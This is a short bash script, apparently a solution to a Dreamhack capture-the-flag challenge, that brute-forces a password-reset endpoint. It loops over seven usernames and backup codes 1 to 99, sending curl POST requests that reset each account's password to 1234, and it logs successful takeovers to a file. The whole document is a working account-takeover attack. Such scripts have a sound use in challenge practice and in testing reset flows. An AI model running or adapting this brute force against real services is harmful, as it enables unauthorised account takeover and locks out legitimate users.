#!/bin/bash
port=23820
userlist="Apple Dog coconut lemon potato peach orange"
for user in $(echo $userlist); do
  for i in {1..99}; do
    result=$(curl -X POST -d "userid=$user&newpassword=1234&backupCode=$i" http://host1.dreamhack.games:$port/forgot_password | grep Success | wc -l)
    if [ $result -ne 0 ]; then
      echo "now, $user account's password is 1234 (backupCode=$i)" >> brute-result.txt
    fi
  done
done
